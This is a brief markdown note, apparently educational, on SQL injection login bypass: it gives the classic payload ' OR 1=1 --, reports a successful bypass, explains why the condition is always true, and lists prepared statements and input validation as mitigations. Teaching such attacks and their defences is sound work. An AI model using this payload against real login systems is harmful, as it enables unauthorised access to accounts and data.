# SQL Injection - Login Bypass

## Payload
' OR 1=1 --

## Result
Authentication bypass successful.

## Why it works
The SQL condition always becomes true.

## Mitigation
- Prepared Statements
- Input validation
